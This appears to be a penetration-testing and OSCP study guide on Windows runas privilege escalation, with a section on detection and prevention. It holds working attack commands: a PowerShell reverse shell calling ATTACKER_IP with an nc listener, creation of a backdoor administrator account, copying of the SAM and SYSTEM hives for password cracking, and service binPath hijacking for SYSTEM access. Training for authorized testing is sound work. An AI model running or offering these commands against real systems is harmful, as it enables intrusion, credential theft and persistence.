# RunAs - Executing Commands with Different Privileges

The `runas` command in Windows allows users to execute programs with different permissions than the current user. This capability is essential for privilege escalation when you've discovered credentials for a more privileged account during penetration testing or red team exercises.

## Basic Syntax and Usage

```cmd
runas /user:<domain\username> "<command>"
```

### Common Parameters

| Parameter | Description |
|-----------|-------------|
| `/user` | Specifies the user account to run the command as |
| `/savecred` | Uses saved credentials (if previously saved) |
| `/netonly` | Indicates the credentials are for remote access only |
| `/noprofile` | Specifies that the user's profile should not be loaded |
| `/env` | Use the current environment instead of the user's |

## Basic Examples

```cmd
# Run Command Prompt as Administrator
runas /user:Administrator cmd.exe

# Run Command Prompt as a domain user
runas /user:DOMAIN\admin cmd.exe

# Open notepad to edit a protected file
runas /user:Administrator "notepad.exe C:\Windows\System32\drivers\etc\hosts"

# Run PowerShell with elevated privileges
runas /user:Administrator "powershell.exe -ExecutionPolicy Bypass"
```

## Privilege Escalation with RunAs

When you discover credentials during a pentest, `runas` can be used for privilege escalation:

### 1. Creating a New Admin User

```cmd
runas /user:Administrator "cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add"
```

### 2. Opening a Backdoor Connection

```cmd
# On attacking machine, start a listener
nc -lvp 4444

# On target, create a reverse shell script (rev.bat)
echo @echo off > rev.bat
echo powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" >> rev.bat

# Execute as Administrator
runas /user:Administrator rev.bat
```

### 3. Accessing Protected Files

```cmd
# Copy SAM and SYSTEM files for offline password cracking
runas /user:Administrator "cmd.exe /c copy C:\Windows\System32\config\SAM C:\temp\SAM.bak"
runas /user:Administrator "cmd.exe /c copy C:\Windows\System32\config\SYSTEM C:\temp\SYSTEM.bak"
```

## Limitations of RunAs

1. **Password Entry**: `runas` will prompt for a password interactively; it doesn't accept pre-supplied passwords in the command line.

2. **SaveCred Option**: The `/savecred` parameter only works if:
   - The user has previously saved credentials using this option
   - The system policy allows credential saving

3. **UAC Limitations**: User Account Control may still block certain administrative actions.

4. **New Session**: Creates a new logon session that doesn't inherit the current session's mapped drives or network connections.

## Bypassing Password Prompt Limitation

Since `runas` requires interactive password entry, here are alternatives for automation:

### 1. Using PowerShell Start-Process

```powershell
$username = "Administrator"
$password = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)
Start-Process -FilePath "cmd.exe" -Credential $cred
```

### 2. Using the SaveCred Option

First, save credentials interactively:
```cmd
runas /savecred /user:Administrator cmd.exe
# Enter password when prompted
```

Then use in scripts without password prompt:
```cmd
runas /savecred /user:Administrator "command to execute"
```

### 3. Using Alternative Tools

```cmd
# PsExec (Sysinternals)
psexec -u Administrator -p Password123! cmd.exe

# PowerShell Invoke-Command
powershell -c "$password = ConvertTo-SecureString 'Password123!' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('Administrator', $password); Invoke-Command -ScriptBlock {whoami} -Credential $cred -Computer localhost"
```

## Finding Saved RunAs Credentials

During penetration testing, you might find saved credentials from previous `runas /savecred` usage:

```cmd
# Check for saved credentials
cmdkey /list

# Registry location for saved credentials
reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunAs"
```

## Real-World Example: Accessing Protected Service Manager

```cmd
# Scenario: Found Administrator credentials during enumeration

# Check service configuration (normally restricted)
runas /user:Administrator "cmd.exe /c sc qc SensitiveService > C:\temp\service_config.txt"

# View the output
type C:\temp\service_config.txt

# Modify service to gain SYSTEM privileges
runas /user:Administrator "cmd.exe /c sc config SensitiveService binPath= \"C:\temp\reverse_shell.exe\" obj= \"LocalSystem\""
```

## Detection and Prevention

System administrators should implement these measures to prevent `runas` abuse:

1. **Disable Credential Saving**: Prevent `/savecred` functionality via Group Policy
2. **Implement Credential Guard**: Protect against credential theft
3. **Audit Usage**: Enable logging of `runas` command execution
4. **Restrict Administrative Access**: Limit who has administrator credentials
5. **Application Control**: Use AppLocker or similar to restrict which programs can be run with `runas`

## OSCP Exam Notes

For the OSCP exam:

1. `runas` is especially useful when credentials are discovered through:
   - Credential hunting in files
   - Registry searches
   - Memory dumping
   - Clear-text password storage

2. The `/savecred` option might be available in misconfigurated environments

3. When `runas` doesn't work, try alternative methods:
   - PowerShell's `Start-Process -Credential`
   - PsExec
   - Windows Management Instrumentation (WMI)

4. Document all attempts with `runas` during the exam, as this demonstrates methodology even if unsuccessful

Remember: Always obtain proper authorization before using these techniques in real environments. 